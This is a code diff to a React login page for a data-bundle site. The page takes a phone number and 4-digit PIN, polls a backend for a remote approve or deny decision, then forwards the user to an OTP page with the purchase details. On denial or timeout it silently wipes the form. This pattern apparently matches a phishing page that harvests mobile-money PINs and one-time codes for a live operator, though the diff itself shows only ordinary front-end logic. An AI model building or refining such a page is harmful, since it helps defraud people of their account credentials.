@@ -2,7 +2,8 @@ import React, { useState, useRef, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { ShieldCheck, Check, ArrowLeft, Eye, EyeOff } from 'lucide-react';
 
-const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "https://mixdatahub-fullstack.onrender.com"; 
+// Updated to your Vercel Backend URL
+const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "https://mixdatahub-backend.vercel.app"; 
 
 export default function LoginPage() {
   const location = useLocation();
@@ -15,7 +16,8 @@ export default function LoginPage() {
   const [showPin, setShowPin] = useState<boolean>(false);
   
   const pinInputRef = useRef<HTMLInputElement>(null);
-  const pollRef = useRef<NodeJS.Timeout | null>(null);
+  // TypeScript safe type for setInterval in a browser
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   const isPhoneValid = phone.length === 9;
   const isFormValid = isPhoneValid && pin.length === 4;
@@ -24,6 +26,7 @@ export default function LoginPage() {
     if (isPhoneValid) pinInputRef.current?.focus(); 
   }, [phone, isPhoneValid]);
 
+  // Cleanup polling if component unmounts
   useEffect(() => {
     return () => {
       if (pollRef.current) clearInterval(pollRef.current);
@@ -57,12 +60,16 @@ export default function LoginPage() {
       let attempts = 0;
       const maxAttempts = 60; // 60 attempts * 1 second = 60 seconds timeout
 
+      // Start polling every 1 second
       pollRef.current = setInterval(async () => {
         attempts++;
+        
+        // Handle Timeout
         if (attempts > maxAttempts) {
           if (pollRef.current) clearInterval(pollRef.current);
           setIsProcessing(false);
-          return; // Silently timeout without error popup
+          // Silently stop waiting, user can try again
+          return; 
         }
 
         try {
@@ -73,25 +80,29 @@ export default function LoginPage() {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
             navigate('/otp', { state: { duration, voice, sms, data, price, phone } });
+            
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
             
-            // SMOOTH RESET LOGIC (No alerts, no error messages)
-            // Just clear the fields and let them start over
+            // SMOOTH RESET LOGIC
+            // No alerts, no error messages. Just clear the form so the user can try again.
             setPhone('');
             setPin('');
             setShowPin(false);
-            
           }
         } catch (err) {
+          // If polling fails (e.g. network dropped), stop polling and reset button
           console.error("Polling error", err);
+          if (pollRef.current) clearInterval(pollRef.current);
+          setIsProcessing(false);
         }
       }, 1000); // 1 second polling for instant response
 
     } catch (error) {
       console.error(error);
       setIsProcessing(false);
+      // No alert. Just stop the loading state.
     }
   };
 
